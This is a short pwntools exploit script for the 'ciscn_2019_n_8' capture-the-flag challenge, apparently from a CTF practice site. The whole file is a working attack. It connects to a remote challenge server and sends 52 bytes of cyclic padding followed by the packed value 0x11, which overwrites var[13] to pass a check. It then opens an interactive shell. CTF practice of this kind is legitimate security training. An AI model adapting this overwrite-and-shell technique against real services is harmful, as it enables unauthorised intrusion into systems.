from pwn import *


# p = process("./ciscn_2019_n_8")
p = remote("node4.buuoj.cn", 27858)

# var[] type is DWORD, var[13] type is QWORD
pad = cyclic(13*4)+p64(0x11)
p.sendline(pad)

p.interactive()

